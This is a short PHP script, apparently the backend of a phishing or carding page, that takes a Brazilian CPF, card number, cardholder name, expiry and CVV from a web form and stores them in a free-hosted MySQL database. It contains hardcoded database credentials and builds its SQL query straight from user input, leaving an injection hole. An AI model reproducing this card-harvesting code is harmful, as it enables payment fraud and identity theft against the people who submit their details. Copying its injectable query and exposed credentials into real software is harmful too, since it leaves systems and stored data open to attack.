<?php
$host = "sql110.infinityfree.com";
$user = "if0_39790610";
$pass = "M10019210a";
$db   = "if0_39790610_Card";

$conn = new mysqli($host, $user, $pass, $db);

if ($conn->connect_error) {
    die("Erro na conexão: " . $conn->connect_error);
}

$cpf          = $_POST['cpf'];
$numero_cartao= $_POST['cardNumber'];
$nome_cartao  = $_POST['cardName'];
$validade     = $_POST['cardExpiry'];
$cvv          = $_POST['cardCVV'];

$sql = "INSERT INTO cards (cpf, numero_cartao, nome_cartao, validade, cvv) 
        VALUES ('$cpf', '$numero_cartao', '$nome_cartao', '$validade', '$cvv')";

if ($conn->query($sql) === TRUE) {
    echo "Cartão salvo com sucesso!";
} else {
    echo "Erro: " . $conn->error;
}

$conn->close();
?>